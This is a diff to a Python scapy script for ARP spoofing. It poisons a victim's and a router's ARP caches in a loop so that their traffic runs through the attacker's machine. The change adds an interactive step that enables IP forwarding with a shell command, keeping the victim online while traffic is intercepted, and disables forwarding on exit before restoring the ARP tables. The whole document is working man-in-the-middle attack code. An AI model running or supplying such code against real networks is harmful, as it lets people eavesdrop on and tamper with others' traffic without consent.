@@ -1,4 +1,5 @@
 #!usr/bin/python3
+import subprocess
 import scapy.all as scapy
 import argparse
 import time
@@ -6,9 +7,9 @@ import time
 
 def get_arguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument('-T', '--target', dest='victim_ip',
+    parser.add_argument('-t', '--target', dest='victim_ip',
                         help='IP of the target machine')
-    parser.add_argument('-R', '--router', dest='router_ip',
+    parser.add_argument('-r', '--router', dest='router_ip',
                         help='IP of the router')
     options = parser.parse_args()
     if not options.victim_ip:
@@ -60,13 +61,26 @@ def restore(dest_ip, src_ip):
     # send the packet to spoof the victim
     scapy.send(packet, count=4, verbose=False)
 
-
+def answer():
+    ans = input('[+]Do you want to forward ports? yes/no: ')
+    if ans.lower() == 'yes' or ans.lower() == 'y':
+        subprocess.call(["echo 1 > /proc/sys/net/ipv4/ip_forward"],  shell=True)
+        print(f'[+] Port forwarded  {ans}')
+    elif ans.lower() == 'no' or ans.lower() == 'n':
+        print(f'Negative answer {ans}')
+    else:
+        print(ans)
+        
 # getting arguments in input from user
 options = get_arguments()
 
 # maintain the spoof as long as I want ^C to interrupt
 # but we need to forward ports to give internet to the victim machine
 # echo 1 > /proc/sys/net/ipv4/ip_forward
+
+        
+answer()
+
 sent_packet_count = 0
 try:
     while True:
@@ -78,5 +92,6 @@ try:
         print('\r[+] Packets sent ' + str(sent_packet_count), end='')
         time.sleep(2)
 except KeyboardInterrupt:
+    subprocess.call(["echo 0 > /proc/sys/net/ipv4/ip_forward"],  shell=True)
     restore(options.victim_ip, options.router_ip)
     print('\n[+] Detected CTRL + C ... Quitting and Restore ARP table.')
